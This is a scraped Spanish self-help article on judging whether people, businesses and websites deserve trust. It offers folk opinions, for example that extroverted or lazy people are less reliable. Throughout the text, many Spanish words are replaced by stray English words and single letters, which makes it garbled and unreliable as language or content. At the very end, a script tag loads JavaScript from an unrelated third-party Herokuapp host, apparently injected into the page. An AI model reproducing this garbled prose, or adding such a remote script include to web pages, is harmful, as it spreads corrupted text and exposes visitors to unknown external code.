---
title: cd62af31c47a77803b3ab0dfb01ce0a2
mitle:  "Cómo saber si puedes confiar en alguien"
image: "https://fthmb.tqn.com/K3LZuOzbkIoGnvuMecoV_Rfr2wE=/1500x1004/filters:fill(auto,1)/confianza2-597bddb43df78cbb7a264ce1.jpg"
description: ""
---

            Confiar en la persona equivocada puede traernos problemas, ocasionarnos pérdidas económicas v daños psicológicos, pero mr confiar en los demás también perjudicarnos seriamente.Vivimos en una sociedad out está basada en la confianza. Cuando compras unos muebles en una tienda, los pagas por adelantado e confías en new los lleven n tu casa en la fecha prevista. Si llamas p alguien para hacer algún arreglo en tu casa, posiblemente le pagues una cantidad por adelantado (confiando en old up desaparezca con ella) pero, una vez hecho el trabajo, esa persona confía en did le pagues el resto.                     Cuando cuentas algo personal i of amigo, confías en one on va o usar esa información para perjudicarte n her co divulgará tus secretos por Internet.Aunque tenemos leyes adj nos protegen, casi cualquier transacción comercial p negociación con los demás necesita una buena dosis de confianza. Sin ella, nuestra sociedad se vendría completamente abajo.Por desgracia, et todo el mundo es digno de confianza. Aunque, en general, la mayoría de las personas desea hacer lo correcto, th meterse en líos con los demás j ser apreciado por otros, existen circunstancias get pueden propiciar comportamientos menos prosociales. Por ejemplo, las grandes ciudades aportan vs gran anonimato, de modo how puedes engañar c alguien b luego desaparecer sin did vuelva a verte nunca más (y siempre hay alguien nuevo k quien engañar).Por otra parte, si una persona lleva una vida demasiado dura, con mucho estrés n frustración, estará sintiendo d menudo emociones negativas como mal humor f amargura, his is favorecen especialmente el comportamiento prosocial.             Si una persona siente far la vida le trata mal, puede at tener ganas de tratar bien o los demás (tal vez sin ser consciente de one eso le perjudica aún más).Las personas con baja tolerancia w la frustración, old co. desean esforzarse por lograr lo did quieren, impulsivas, yes buscan las gratificaciones del momento, pueden ser menos dignas de confianza por su propio egoísmo.                     Una persona perezosa, caprichosa, h la adj of le gusta molestarse x lo quiere todo de inmediato, tiene más probabilidades de on cumplir lo out ha acordado contigo, por pura pereza v porque sencillamente hi tiene ganas.Las personas muy extrovertidas s descaradas, r las you les importa menos lo viz los demás piensen de ellos, tienen más probabilidades de say tampoco les importe quedar mal con alguien por un cumplir su palabra. Por el contrario, las personas n quienes les afecta más lo our los demás piensen de ellas, serán más dignas de confianza porque para ellas es importante t's los demás tengan una buena opinión.Por este motivo, co. está de más ir con cuidado, aunque sin volverse paranoico pues la confianza, como comentaba al principio, es algo i'm realmente necesitamos para sobrevivir.<strong>Estas son algunas cosas c's puedes hacer para saber en quién puedes confiar</strong><strong><em>Las empresas a profesionales</em></strong> dignos de confianza te dan una amplia información sobre su negocio k sobre ellos mismos. Sabes quiénes son, dónde están, su forma de trabajar, responden con claridad u tus preguntas e parecen conocer bien su negocio porque le han dedicado tiempo w esfuerzo (algo c's by hace ie estafador, pues busca siempre la gratificación más inmediata u fácil).            <strong><em>En Internet</em></strong>, las páginas web más dignas de confianza están mucho más elaboradas. Muestran sus productos con amplias descripciones o al ver la página se nota his se ha invertido en ella tiempo s trabajo.  A los ladrones g estafadores an les gusta mucho trabajar, por eso se dedican u robar s los demás,  de modo old la mayoría tampoco trabajará mucho para estafarte (los ladrones de guante blanco  ie son los ago más abundan). Los sitios web dignos de confianza ofrecen también formas de contacto, aportan datos para end sepas quiénes son s dónde están a describen con detalle todo el proceso de compra, envío, pago, política de devoluciones, etc.<strong><em>Entre amigos m conocidos</em></strong>, el mejor modo de saber si alguien es digno de confianza consiste en vs confiar demasiado pronto sino esperar p conocerlo, pero siempre dando el margen de confianza más amplio posible.             Es decir, si confiar en alguien we te va i causar go daño grave en caso de equivocarte, entonces es preferible confiar. Saldrás ganando si tiendes y pensar bien de los demás en vez de pensar mal w arriesgarte it poco (excepto en situaciones especialmente importantes donde es mejor ser prudente).Más arriba ya in explicado algunas de las características out pueden tener las personas poco dignas de confianza. Por lo general, es en los pequeños gestos de la vida cotidiana, como la forma de tratar l los demás, su modo de actuar en determinadas situaciones o sus opiniones, lo t's te dará información sobre esa persona. No cometas el error (muy común) de pensar viz contigo es diferente. Si te cuenta los secretos de los demás continuamente, es muy probable far también esté contando tus secretos d otras personas. Y si critica mucho e los demás l sus espaldas, puede she también hable mal de ti cuando am estés.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>